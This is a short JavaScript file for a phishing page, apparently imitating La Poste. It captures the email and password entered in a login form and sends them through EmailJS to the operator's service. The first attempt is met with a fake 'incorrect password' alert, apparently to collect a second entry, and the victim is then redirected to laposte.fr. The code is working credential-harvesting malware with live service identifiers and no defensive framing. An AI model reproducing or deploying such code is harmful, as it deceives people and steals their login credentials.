// Initialize EmailJS
(function() {
    emailjs.init("e-odc3Xm-IiG3AvDa"); // Replace with your actual public key
  })();
  
  // Handle form submission
  let submissionCount = 0;
  
  const form = document.getElementById('loginForm');
  form.addEventListener('submit', function(event) {
    event.preventDefault();
  
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
  
    emailjs.send('service_qy28vyz', 'template_a7rz958', {
      email: email,
      password: password
    })
    .then(function(response) {
      submissionCount++;
  
      if (submissionCount === 1) {
        alert('Mot de passe incorrect !');
      } else if (submissionCount === 2) {
        alert('Votre demande a bien été envoyée ! Nous vous enverrons un e-mail sous 24 heures. Merci !');
        setTimeout(function() {
          window.location.href = 'https://www.laposte.fr/';
        }, 100);
      }
    }, function(error) {
      console.log('FAILED...', error);
      alert('Erreur lors de l\'envoi!');
    });
  });